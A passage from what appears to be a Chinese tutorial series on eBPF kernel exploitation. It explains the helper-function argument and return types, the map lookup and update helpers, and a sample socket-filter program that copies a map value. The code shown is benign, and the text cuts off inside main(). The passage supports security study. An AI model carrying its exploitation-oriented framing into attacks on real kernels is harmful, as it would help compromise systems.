<p>可以看出该程序仅仅是进行了一些<del>意义不明的</del>寄存器和栈操作，并没有什么实际用处。为了拓展程序功能，同时减少内核上下文切换的开销，ebPF提供了一系列Helper函数，来实现更强大方便的功能。</p>
<h2 id="Helper函数"><a href="#Helper函数" class="headerlink" title="Helper函数"></a>Helper函数</h2><p>eBPF中的Helper函数是内核函数，运行在内核上下文，可以允许eBPF程序如同调用函数一样与内核交互<br>Helper函数功能强大，用途很广。目前一共有211个Helper函数，可以被分为map相关，trace程序相关，print相关，网络相关等类别<br>在eBPF pwn中，一般只需要关注部分常用&#x2F;方便漏洞利用的Helper函数即可</p>
<blockquote>
<p>调用函数的方法如下所示</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_NAME)</span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="传参规则"><a href="#传参规则" class="headerlink" title="传参规则"></a>传参规则</h3><p>在调用Helper函数之前，我们先了解一下Helper函数的传参类型规则。以下是一个示例Helper函数原型：</p>
<figure class="highlight c"><figcaption><span>函数原型</span><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.13.7/source/kernel/bpf/helpers.c#L109">出处</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">bpf_func_proto</span> <span class="title">bpf_map_pop_elem_proto</span> =</span> &#123;</span><br><span class="line"> .func  = bpf_map_pop_elem,</span><br><span class="line"> .gpl_only = <span class="literal">false</span>,</span><br><span class="line"> .ret_type = RET_INTEGER,</span><br><span class="line"> .arg1_type = ARG_CONST_MAP_PTR,</span><br><span class="line"> .arg2_type = ARG_PTR_TO_MAP_VALUE | MEM_UNINIT | MEM_WRITE,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>其中我们需要注意三个类型：<code>ret_type</code>（类型为<code>bpf_return_type</code>）, <code>arg_type</code>（类型为<code>bpf_arg_type</code>）及其后边或操作的参数标志(类型为<code>bpf_type_flag</code>)</p>
<ul>
<li>参数类型<code>bpf_arg_type</code></li>
</ul>
<figure class="highlight c"><figcaption><span>部分</span><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.13.7/source/include/linux/bpf.h#L750">完整版</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 函数参数约束 */</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">bpf_arg_type</span> &#123;</span></span><br><span class="line">  ARG_DONTCARE = <span class="number">0</span>, <span class="comment">/* 在helper函数中没有用的参数*/</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/* 以下的约束在函数</span></span><br><span class="line"><span class="comment">  * bpf_map_lookup/update/delete_elem() 中使用</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  ARG_CONST_MAP_PTR, <span class="comment">/* 常量(const)参数 用作指向bpf_map的指针 */</span></span><br><span class="line">  ARG_PTR_TO_MAP_KEY, <span class="comment">/* 指向栈的指针，用作map的键(key) */</span></span><br><span class="line">  ARG_PTR_TO_MAP_VALUE, <span class="comment">/* 指向栈的指针，用作map的值(value) */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/* 在函数原型bpf_memcmp()和其他访问eBPF程序栈上数据的函数使用 */</span></span><br><span class="line">  ARG_PTR_TO_MEM,  <span class="comment">/* 指向有效地址的指针(stack, packet, map value) */</span></span><br><span class="line">  ARG_PTR_TO_ARENA,</span><br><span class="line"></span><br><span class="line">  ARG_CONST_SIZE,  <span class="comment">/* 访问内存的字节数量 */</span></span><br><span class="line">  ARG_CONST_SIZE_OR_ZERO, <span class="comment">/* 访问内存的字节数量(可以是0) */</span></span><br><span class="line"></span><br><span class="line">  ARG_PTR_TO_CTX,  <span class="comment">/* 指向context */</span></span><br><span class="line">  ARG_ANYTHING,  <span class="comment">/* 任意 (初始化的) 参数 */</span></span><br><span class="line">  ...</span><br><span class="line">  ARG_PTR_TO_FUNC, <span class="comment">/* 指向bpf函数的指针 */</span></span><br><span class="line">  ARG_PTR_TO_STACK, <span class="comment">/* 指向eBPF栈(stack) */</span></span><br><span class="line">  ARG_PTR_TO_CONST_STR, <span class="comment">/* 指向一个空字符(\x00)截止的只读字符串 */</span></span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>ARG_CONST_MAP_PTR</code>: 该类型可以由宏<code>BPF_LD_MAP_FD</code>（出自bpf_insn.h，见上文）传入map的文件描述符得到</p>
<p><code>ARG_PTR_TO_CTX</code>: 该类型为<code>BPF_REG_1</code>在运行前被赋值的类型</p>
<ul>
<li>返回值类型<code>bpf_return_type</code></li>
</ul>
<figure class="highlight c"><figcaption><span>部分</span><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.13.7/source/include/linux/bpf.h#L809">完整版</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* helper函数返回值的类型 */</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">bpf_return_type</span> &#123;</span></span><br><span class="line">  RET_INTEGER,   <span class="comment">/*  函数返回整数(int)*/</span></span><br><span class="line">  RET_VOID,   <span class="comment">/* 函数什么也不返回 */</span></span><br><span class="line">  RET_PTR_TO_MAP_VALUE,  <span class="comment">/* 返回一个指向map元素值(value)的指针*/</span></span><br><span class="line">  RET_PTR_TO_SOCKET,  <span class="comment">/* 返回一个指向socket结构体的指针 */</span></span><br><span class="line">  RET_PTR_TO_TCP_SOCK,  <span class="comment">/* 返回一个指向tcp_sock结构体的指针 */</span></span><br><span class="line">  RET_PTR_TO_SOCK_COMMON,  <span class="comment">/* 返回一个指向sock_common结构体的指针 */</span></span><br><span class="line">  RET_PTR_TO_MEM,   <span class="comment">/* 返回一个指向内存的指针 */</span></span><br><span class="line">  RET_PTR_TO_MEM_OR_BTF_ID, <span class="comment">/* 返回一个指向合法地址的指针或一个btf_id */</span></span><br><span class="line">  RET_PTR_TO_BTF_ID,  <span class="comment">/* 返回一个指向btf_id的指针 */</span></span><br><span class="line">  __BPF_RET_TYPE_MAX,</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>扩展部分增加了不少<code>RET_PTR_TO_XXX_OR_NULL</code>类型，本质上是在原类型的基础上增加了标志<code>PTR_MAYBE_NULL</code><br>这种类型在检验的时候会兼顾两种情况，在编写时要增加检验0的操作(if R0 &#x3D;&#x3D; 0 then exit)</p>
</blockquote>
<ul>
<li>附加参数标志<code>bpf_type_flag</code></li>
</ul>
<figure class="highlight c"><figcaption><span>部分</span><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.13.7/source/include/linux/bpf.h#L629">完整版</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">bpf_type_flag</span> &#123;</span></span><br><span class="line">  <span class="comment">/* PTR 可能为 NULL. */</span></span><br><span class="line">  PTR_MAYBE_NULL  = BIT(<span class="number">0</span> + BPF_BASE_TYPE_BITS),</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* MEM 是只读的。当在bpf_arg上应用时，表明该参数既可以是</span></span><br><span class="line"><span class="comment">    * 可变内存也可以是不可变内存.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">  MEM_RDONLY  = BIT(<span class="number">1</span> + BPF_BASE_TYPE_BITS),</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* MEM 指向 BPF 保留的环形缓冲区(ring buffer reservation). */</span></span><br><span class="line">  MEM_RINGBUF  = BIT(<span class="number">2</span> + BPF_BASE_TYPE_BITS),</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* MEM 在用户空间内. */</span></span><br><span class="line">  MEM_USER  = BIT(<span class="number">3</span> + BPF_BASE_TYPE_BITS),</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* MEM 可以未初始化. */</span></span><br><span class="line">  MEM_UNINIT  = BIT(<span class="number">7</span> + BPF_BASE_TYPE_BITS),</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 大小在编译期就明确. */</span></span><br><span class="line">  MEM_FIXED_SIZE  = BIT(<span class="number">10</span> + BPF_BASE_TYPE_BITS),</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 内存必须在某些架构上对齐，</span></span><br><span class="line"><span class="comment">    * 与MEM_FIXED_SIZE一起使用.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">  MEM_ALIGNED  = BIT(<span class="number">17</span> + BPF_BASE_TYPE_BITS),</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* MEM 将要被写入, 经常和 MEM_UNINIT 一起使用. Non-presence</span></span><br><span class="line"><span class="comment">    * 不出现 MEM_WRITE 意味着 MEM 仅仅被读取. MEM_WRITE 在不与</span></span><br><span class="line"><span class="comment">    * MEM_UNINIT 搭配时意味着该内存需要初始化，因为它也会被读取.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">  MEM_WRITE  = BIT(<span class="number">18</span> + BPF_BASE_TYPE_BITS),</span><br><span class="line"></span><br><span class="line">  __BPF_TYPE_FLAG_MAX,</span><br><span class="line">  __BPF_TYPE_LAST_FLAG = __BPF_TYPE_FLAG_MAX - <span class="number">1</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>这些参数可以以按位或的方式与<code>ARG_PTR_TO_xxx</code>组合</p>
<p>在寄存器章节有讲到，<code>BPF_REG_1</code> ~ <code>BPF_REG_5</code>依次为Helper函数参数传递寄存器，<code>BPF_REG_0</code>存放Helper函数返回值，我们便可以根据参数编写正确的Helper调用。</p>
<h3 id="Helper函数介绍"><a href="#Helper函数介绍" class="headerlink" title="Helper函数介绍"></a>Helper函数介绍</h3><p>map相关Helper函数</p>
<ul>
<li><code>bpf_map_lookup_elem</code></li>
</ul>
<figure class="highlight c"><figcaption><span>原型</span><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.13.7/source/kernel/bpf/helpers.c#L45">出处</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">bpf_func_proto</span> <span class="title">bpf_map_lookup_elem_proto</span> =</span> &#123;</span><br><span class="line">  .func  = bpf_map_lookup_elem,</span><br><span class="line">  .gpl_only = <span class="literal">false</span>,</span><br><span class="line">  .pkt_access = <span class="literal">true</span>,</span><br><span class="line">  .ret_type = RET_PTR_TO_MAP_VALUE_OR_NULL,</span><br><span class="line">  .arg1_type = ARG_CONST_MAP_PTR,</span><br><span class="line">  .arg2_type = ARG_PTR_TO_MAP_KEY,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *(* <span class="type">const</span> bpf_map_lookup_elem)(<span class="type">void</span> *<span class="built_in">map</span>, <span class="type">const</span> <span class="type">void</span> *key) = (<span class="type">void</span> *) <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_map_lookup_elem)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>arg1 类型见上文<br>arg2 类型为<code>ARG_PTR_TO_MAP_KEY</code>，事实上用一个指向栈的指针即可</p>
</blockquote>
<p>在map中根据key来查找value</p>
<p>返回值为一个指向map value的指针或NULL（0），需要判断空指针操作</p>
<ul>
<li><code>bpf_map_update_elem</code></li>
</ul>
<figure class="highlight c"><figcaption><span>原型</span><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.13.7/source/kernel/bpf/helpers.c#L62">出处</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">bpf_func_proto</span> <span class="title">bpf_map_update_elem_proto</span> =</span> &#123;</span><br><span class="line">  .func  = bpf_map_update_elem,</span><br><span class="line">  .gpl_only = <span class="literal">false</span>,</span><br><span class="line">  .pkt_access = <span class="literal">true</span>,</span><br><span class="line">  .ret_type = RET_INTEGER,</span><br><span class="line">  .arg1_type = ARG_CONST_MAP_PTR,</span><br><span class="line">  .arg2_type = ARG_PTR_TO_MAP_KEY,</span><br><span class="line">  .arg3_type = ARG_PTR_TO_MAP_VALUE,</span><br><span class="line">  .arg4_type = ARG_ANYTHING,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="title function_">long</span> <span class="params">(* <span class="type">const</span> bpf_map_update_elem)</span><span class="params">(<span class="type">void</span> *<span class="built_in">map</span>,</span></span><br><span class="line"><span class="params">                                          <span class="type">const</span> <span class="type">void</span> *key,</span></span><br><span class="line"><span class="params">                                          <span class="type">const</span> <span class="type">void</span> *value,</span></span><br><span class="line"><span class="params">                                          __u64 flags)</span> = (<span class="type">void</span> *) <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_map_update_elem)</span><br></pre></td></tr></table></figure>

<p>更新&#x2F;插入key-value对，flag参数为<code>BPF_NOEXIST</code>（key不存在时才会更新），<code>BPF_EXIST</code>（仅在key存在时更新）或<code>BPF_ANY</code>（两种情况均可）</p>
<blockquote>
<p>和用户态调用参数一致</p>
<blockquote>
<p>arg2, arg3类型均可以用指向栈的指针</p>
</blockquote>
</blockquote>
<p>如果成功返回0,失败则返回一个负的错误号</p>
<h3 id="完整示例程序"><a href="#完整示例程序" class="headerlink" title="完整示例程序"></a>完整示例程序</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;./bpf_insn.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/unistd_64.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/bpf_common.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ptr_to_u64(val) (uint64_t)val</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> bpf(cmd, attr, size) syscall(__NR_bpf, cmd, attr, size)</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> map_fd;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">bpf_create_map</span><span class="params">(<span class="keyword">enum</span> bpf_map_type map_type, <span class="type">unsigned</span> <span class="type">int</span> key_size,</span></span><br><span class="line"><span class="params">                          <span class="type">unsigned</span> <span class="type">int</span> value_size, <span class="type">unsigned</span> <span class="type">int</span> max_entries,</span></span><br><span class="line"><span class="params">                          <span class="type">unsigned</span> <span class="type">int</span> map_flags)</span> &#123;</span><br><span class="line">  <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">      .map_type = map_type,</span><br><span class="line">      .key_size = key_size,</span><br><span class="line">      .value_size = value_size,</span><br><span class="line">      .max_entries = max_entries,</span><br><span class="line">      .map_flags = map_flags,</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> bpf(BPF_MAP_CREATE, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">bpf_lookup_elem</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="type">void</span> *key, <span class="type">void</span> *value)</span> &#123;</span><br><span class="line">  <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">      .map_fd = fd,</span><br><span class="line">      .key = ptr_to_u64(key),</span><br><span class="line">      .value = ptr_to_u64(value),</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> bpf(BPF_MAP_LOOKUP_ELEM, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">bpf_update_elem</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="type">void</span> *key, <span class="type">const</span> <span class="type">void</span> *value,</span></span><br><span class="line"><span class="params">                           <span class="type">uint64_t</span> flags)</span> &#123;</span><br><span class="line">  <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">      .map_fd = fd,</span><br><span class="line">      .key = ptr_to_u64(key),</span><br><span class="line">      .value = ptr_to_u64(value),</span><br><span class="line">      .flags = flags,</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> bpf(BPF_MAP_UPDATE_ELEM, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOG_BUF_SIZE 0x800</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> bpf_log_buf[LOG_BUF_SIZE];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">bpf_prog_load_once</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">insns</span>[] =</span> &#123;</span><br><span class="line">      BPF_MOV64_REG(BPF_REG_9, BPF_REG_1),</span><br><span class="line"></span><br><span class="line">      BPF_LD_MAP_FD(BPF_REG_1, map_fd),</span><br><span class="line"></span><br><span class="line">      BPF_ST_MEM(BPF_DW, BPF_REG_10, <span class="number">-0x8</span>, <span class="number">0x0</span>),</span><br><span class="line">      BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),</span><br><span class="line">      BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, <span class="number">-0x8</span>),</span><br><span class="line">      BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_map_lookup_elem),</span><br><span class="line">      BPF_JMP_IMM(BPF_JNE, BPF_REG_0, <span class="number">0</span>, <span class="number">1</span>), BPF_EXIT_INSN(),</span><br><span class="line">      BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_0, <span class="number">0</span>), BPF_MOV64_IMM(BPF_REG_0, <span class="number">0</span>),</span><br><span class="line"></span><br><span class="line">      BPF_ALU64_IMM(BPF_ADD, BPF_REG_6, <span class="number">0x10</span>), BPF_LD_MAP_FD(BPF_REG_1, map_fd),</span><br><span class="line"></span><br><span class="line">      BPF_ST_MEM(BPF_DW, BPF_REG_10, <span class="number">-0x8</span>, <span class="number">0x1</span>),</span><br><span class="line"></span><br><span class="line">      BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),</span><br><span class="line">      BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, <span class="number">-0x8</span>),</span><br><span class="line"></span><br><span class="line">      BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_6, <span class="number">-0x10</span>),</span><br><span class="line"></span><br><span class="line">      BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),</span><br><span class="line">      BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, <span class="number">-0x10</span>),</span><br><span class="line"></span><br><span class="line">      BPF_MOV64_IMM(BPF_REG_4, BPF_ANY),</span><br><span class="line"></span><br><span class="line">      BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_map_update_elem),</span><br><span class="line">      BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, <span class="number">0</span>, <span class="number">1</span>), BPF_EXIT_INSN(),</span><br><span class="line"></span><br><span class="line">      BPF_MOV64_IMM(BPF_REG_0, <span class="number">0x0</span>), BPF_EXIT_INSN()&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">      .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,</span><br><span class="line">      .insns = ptr_to_u64(&amp;insns),</span><br><span class="line">      .insn_cnt = <span class="keyword">sizeof</span>(insns) / <span class="keyword">sizeof</span>(<span class="keyword">struct</span> bpf_insn),</span><br><span class="line">      .license = ptr_to_u64(<span class="string">&quot;GPL&quot;</span>),</span><br><span class="line">      .log_buf = ptr_to_u64(bpf_log_buf),</span><br><span class="line">      .log_size = LOG_BUF_SIZE,</span><br><span class="line">      .log_level = <span class="number">2</span>,</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> bpf(BPF_PROG_LOAD, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> sockets[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">trigger1</span><span class="params">(<span class="type">int</span> prog_fd, <span class="type">uint64_t</span> *payload)</span> &#123;</span><br><span class="line">  socketpair(AF_UNIX, SOCK_DGRAM, <span class="number">0</span>, sockets);</span><br><span class="line">  setsockopt(sockets[<span class="number">1</span>], SOL_SOCKET, SO_ATTACH_BPF, &amp;prog_fd, <span class="keyword">sizeof</span>(prog_fd));</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> *buffer = (<span class="type">char</span> *)payload;</span><br><span class="line">  <span class="keyword">return</span> write(sockets[<span class="number">0</span>], buffer, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">  map_fd =</span><br><span class="line">      bpf_create_map(BPF_MAP_TYPE_ARRAY, <span class="keyword">sizeof</span>(<span class="type">int</span>), <span class="keyword">sizeof</span>(<span class="type">uint64_t</span>), <span class="number">0x2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (map_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Error while creating bpf map&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> key = <span class="number">0</span>;</span><br><span class="line">  <span class="type">uint64_t</span> value = <span class="number">0xaaaabbbb</span>;</span><br><span class="line">  bpf_update_elem(map_fd, &amp;key, &amp;value, BPF_ANY);</span><br><span class="line">  <span class="comment">// map[0] = 0xaaaabbbb</span></span><br><span class="line"></span><br><span class="line">  